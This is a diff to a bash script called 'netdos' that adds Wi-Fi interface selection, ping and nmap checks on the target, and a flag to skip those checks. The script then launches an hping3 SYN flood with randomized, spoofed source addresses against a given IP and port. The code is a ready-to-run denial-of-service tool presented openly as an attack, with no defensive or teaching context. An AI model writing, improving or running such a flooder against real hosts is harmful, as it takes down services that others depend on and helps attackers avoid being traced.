@@ -3,7 +3,7 @@
 clear
 
 color_banner() {
-echo -e "\033[1;34m     
+    echo -e "\033[1;34m     
       ███╗   ██╗███████╗████████╗██████╗  ██████╗ ███████╗      
 ▄ ██╗▄████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗██╔════╝▄ ██╗▄
  ████╗██╔██╗ ██║█████╗     ██║   ██║  ██║██║   ██║███████╗ ████╗
@@ -15,17 +15,131 @@ echo -e "\033[1;34m
 
 color_banner
 
+log_info() {
+    echo -e "\n\033[1;36m[INFO] $1\033[0m"
+}
+
+log_error() {
+    echo -e "\n\033[1;31m[ERROR] $1\033[0m"
+}
+
+trap_ctrl_c() {
+    log_info "Ctrl+C received. Exiting..."
+    exit 0
+}
+
+detect_wifi_devices() {
+    log_info "Detecting WiFi devices on the machine..."
+    wifi_devices=($(iw dev | grep Interface | awk '{print $2}'))
+
+    if [ ${#wifi_devices[@]} -eq 0 ]; then
+        log_error "No WiFi devices found on the machine."
+        exit 1
+    fi
+
+    log_info "Available WiFi devices:"
+    for ((i=0; i<${#wifi_devices[@]}; i++)); do
+        log_info "$((i+1)). ${wifi_devices[i]}"
+    done
+
+    read -n 1 -p "Select a WiFi device (enter the number): " wifi_device_number
+
+    if ! [[ "$wifi_device_number" =~ ^[0-9]+$ ]] || [ "$wifi_device_number" -lt 1 ] || [ "$wifi_device_number" -gt ${#wifi_devices[@]} ]; then
+        log_error "Invalid selection. Please enter a valid number."
+        exit 1
+    fi
+
+    selected_wifi_device=${wifi_devices[$((wifi_device_number-1))]}
+    log_info "Selected WiFi device: $selected_wifi_device"
+}
+
+detect_ip_version() {
+    local target_ip=$1
+
+    log_info "Detecting IP version for $target_ip"
+
+    if [[ $target_ip =~ .*:.* ]]; then
+        log_info "Detected IPv6 address."
+        ping -c 1 -6 $target_ip > /dev/null 2>&1
+    else
+        log_info "Detected IPv4 address."
+        ping -c 1 $target_ip > /dev/null 2>&1
+    fi
+
+    if [ $? -ne 0 ]; then
+        log_error "Host $target_ip is unreachable."
+        exit 1
+    fi
+}
+
+check_open_port() {
+    local target_ip=$1
+    local target_port=$2
+
+    log_info "Checking if $target_ip:$target_port is reachable..."
+
+    ping -c 1 $target_ip > /dev/null 2>&1
+    if [ $? -ne 0 ]; then
+        log_error "Host $target_ip is unreachable."
+        exit 1
+    fi
+
+    nmap -p $target_port $target_ip | grep -qE "$target_port.*open"
+    if [ $? -ne 0 ]; then
+        log_error "Port $target_port on $target_ip is not open."
+        exit 1
+    else
+        log_info "Port $target_port on $target_ip is open, flooding..."
+    fi
+}
+
 if [ "$EUID" -ne 0 ]; then
-    echo "Please run as root (use sudo)."
+    log_error "Please run as root (use sudo)."
     exit 1
 fi
 
+skip_check=false
+
+if [ "$1" == "-o" ]; then
+    skip_check=true
+    shift
+fi
+
+while getopts ":o" opt; do
+    case $opt in
+        o)
+            skip_check=true
+            ;;
+        \?)
+            log_error "Invalid option: -$OPTARG" >&2
+            exit 1
+            ;;
+    esac
+done
+
+shift $((OPTIND-1))
+
 if [ $# -ne 2 ]; then
-    echo -e "Usage: netdos <ip_address> <port>\e[0m"
+    echo -e "\n\033[1;31mUsage: netdos [-o] [ip_address] [port]"
+    echo -e "\n\033[1;31m-o: Skips checking if IP/Port is online."
     exit 1
 fi
+
+detect_wifi_devices
 
 ip_address=$1
 port=$2
 
-hping3 --flood --interface wlan0 -p $port -S --rand-source $ip_address 
+if [ "$skip_check" = false ]; then
+    detect_ip_version $ip_address
+    check_open_port $ip_address $port
+fi
+
+if [ "$skip_check" = true ]; then
+    detect_ip_version $ip_address
+fi
+
+trap trap_ctrl_c INT
+
+log_info "Running hping3 flood attack on $ip_address:$port"
+hping3 --flood --interface $selected_wifi_device -p $port -S --rand-source $ip_address
